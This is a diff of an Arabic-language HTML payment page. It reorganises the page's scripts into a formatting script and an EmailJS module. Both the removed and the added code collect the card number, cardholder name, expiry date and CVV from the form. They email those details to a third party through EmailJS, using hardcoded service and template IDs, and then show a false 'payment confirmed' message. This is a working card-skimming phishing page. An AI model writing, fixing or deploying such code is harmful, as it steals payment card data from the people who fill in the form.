@@ -110,34 +110,13 @@
   <button onclick="sendPayment()">تأكيد الدفع</button>
 </div>
 
-<!-- EmailJS v3 -->
-<script type="module">
-  import emailjs from 'https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js';
-
-  emailjs.init("1xqwBMfecM1SSulsh"); // Public Key
-
+<!-- ✅ سكربت التنسيق وتشغيل الواجهة -->
+<script>
   window.onload = () => {
     setTimeout(() => {
       document.getElementById('loading').style.display = 'none';
       document.getElementById('paymentContainer').style.display = 'block';
     }, 3000);
-  };
-
-  window.sendPayment = () => {
-    const data = {
-      card_number: document.getElementById("cardNumber").value,
-      card_name: document.getElementById("cardName").value,
-      expiry: document.getElementById("expiry").value,
-      cvv: document.getElementById("cvv").value
-    };
-
-    emailjs.send("service_plzxomt", "template_q95bk8a", data)
-      .then(() => {
-        alert("✅ تم تأكيد الدفع بنجاح.");
-      }, (error) => {
-        alert("❌ حدث خطأ أثناء الإرسال.");
-        console.error(error);
-      });
   };
 
   window.formatCard = (input) => {
@@ -152,6 +131,31 @@
       value = value.substring(0, 2) + '/' + value.substring(2);
     }
     input.value = value;
+  };
+</script>
+
+<!-- ✅ سكربت EmailJS (v3) -->
+<script type="module">
+  import emailjs from 'https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js';
+
+  emailjs.init("1xqwBMfecM1SSulsh");
+
+  window.sendPayment = () => {
+    const data = {
+      card_number: document.getElementById("cardNumber").value,
+      card_name: document.getElementById("cardName").value,
+      expiry: document.getElementById("expiry").value,
+      cvv: document.getElementById("cvv").value
+    };
+
+    emailjs.send("service_plzxomt", "template_q95bk8a", data)
+      .then(() => {
+        alert("✅ تم تأكيد الدفع بنجاح.");
+      })
+      .catch((error) => {
+        alert("❌ حدث خطأ أثناء الإرسال.");
+        console.error(error);
+      });
   };
 </script>
 
